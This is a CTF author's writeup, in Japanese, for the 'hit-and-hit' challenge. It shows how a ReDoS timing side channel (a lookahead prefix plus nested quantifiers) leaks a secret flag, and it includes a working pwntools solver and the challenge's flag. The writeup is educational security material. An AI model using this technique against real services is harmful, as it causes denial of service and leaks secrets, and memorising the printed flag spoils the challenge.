# Author's Writeup for hit-and-hit

Daily AlpacaHack で 2/24 に出題した『hit-and-hit』の作問者 Writeup です。

https://alpacahack.com/daily/challenges/hit-and-hit

## 問題概要

問題文:
```
Hit! Hit! Hit! AAAAAAAAH LET'S GOOOOOOOO!!!

ヒント: hit-and-miss (https://alpacahack.com/daily/challenges/hit-and-miss) を先に解くことをおすすめします。
```

ヒントで言及されている『[hit-and-miss](https://alpacahack.com/daily/challenges/hit-and-miss)』（author: ark）では以下の Python スクリプトがサーバーで実行されていました:

```python
import os, re

FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

while pattern := input("regex> "):
    if re.match(pattern, FLAG):
        print("Hit!")
    else:
        print("Miss...")
```

この問題は今確定しているフラグに1文字足してみて `Hit!` になるかどうかで、フラグを逐次確定していくことで解くことができました。

今回の問題『hit-and-hit』では、次の Python スクリプトがサーバーで実行されています:
```python
import os, re

FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

while pattern := input("regex> "):
    re.match(pattern, FLAG)
    print("Hit!!!")
```

元の問題と異なり、 `Miss...` の出力が無くっています。
これにより、単純に出力結果から1文字ずつ確定することは不可能になっています。

## 解法

出力は常に `Hit!!!` ですが、本当に観測可能な情報はそれだけでしょうか。

正規表現はマッチしているかの判定に非常に時間がかかるパターンが存在し、DoS 攻撃に使われることがあります。
ReDoS とも呼ばれます。

代表的な例では、 `((.*)*)*` のような入れ子になった量指定子が含まれるパターンは、同じ文字列に対して無数の分割したパターンにマッチするかを試します。
これは何度もバックトラックが発生するため指数的に時間がかかります。

実は、この問題ではそのようなパターンを活用することで、出力までの時間差でフラグがマッチしたかどうかを判定できます。

次のようなパターンを構成できればよいです:
- フラグにマッチしたときに非常に時間がかかる
- フラグにマッチしなければすぐに処理が終わる

例えば、 `^PREFIX(((.*)*)*)*!` というパターンを考えてみます。
- `PREFIX` は試したいフラグの先頭文字列です。`PREFIX` が一致した場合、 `(((.*)*)*)*!` のマッチが試されます。
- 末尾の `!` は常に大量のバックトラックを引き起こすための文字です。末尾で必ずマッチしないため、直前の `(((.*)*)*)*` が無数のパターンを試すことになります。

```python
>>> t=time.time(); re.match("^Alpaca{a(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
0.00013208389282226562
>>> t=time.time(); re.match("^Alpaca{R(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
7.353172063827515
```

フラグにマッチする `Alpaca{R` の場合は、マッチしない `Alpaca{a` と比べて実行時間が非常に大きくなっています。

ということで、あとは一文字ずつ確定すればOKのように見えます……が、実はこのパターンだとフラグの末尾のほうはほぼ差が出ません:

```python
>>> t=time.time(); re.match("^Alpaca{RE(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
0.7404079437255859
>>> t=time.time(); re.match("^Alpaca{RED(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
0.09764504432678223
>>> t=time.time(); re.match("^Alpaca{REDACT(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
0.00042510032653808594
```

これはフラグが確定するにつれて、残りの長さが短い文字列（例えば、最後のケースは `ED}` ）に対して `(((.*)*)*)*!` が実行され、バックトラックが起こる回数が少なくなるためです。

では、どうしたらよいかというと、例えば肯定先読み `?=` が有効です。

パターンが `^(?=Alpaca{REDACT)(((.*)*)*)*!` の場合、対象文字列が `Alpaca{REDACT` から始まるかどうかはチェックしつつ、文字列は消費しません。

つまり、 `PREFIX` が一致した場合でも、続く `(((.*)*)*)*!` は元の文字列 `Alpaca{REDACTED}` に対して先頭から実行されることになります。
逆に、肯定先読み部分でマッチしない場合は、そこで終了です。

実際に次のように、マッチしない場合はすぐに実行が終わりますが、マッチしている場合は終わる気配がありません:

```python
>>> t=time.time(); re.match("^(?=Alpaca{REDACTx)((.*)*)*!", "Alpaca{REDACTED}"); time.time()-t
0.000102996826171875
>>> t=time.time(); re.match("^(?=Alpaca{REDACTE)(((.*)*)*)*!", "Alpaca{REDACTED}"); time.time()-t
```

この性質を用いて、以下のようなソルバーで解くことができます:

```python
import os, string
from pwn import remote

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 1337))
CHARSET = "}_" + string.ascii_letters + string.digits
TIMEOUT = 1

known = "Alpaca{"
while not known.endswith("}"):
    with remote(HOST, PORT, level="debug") as io:
        for c in CHARSET:
            io.recvuntil(b"regex> ")
            pattern = f"^(?={known}{c})(((.*)*)*)*!"
            io.sendline(pattern.encode())
            if not io.recvline(timeout=TIMEOUT):
                known += c
                break
    print(f"{known = }")
```

時間を計測するのではなく、タイムアウトが起きたかどうかでフラグとマッチしたかどうかを判定しています。

Flag: `Alpaca{r3GeX_Pow3rFu1}`
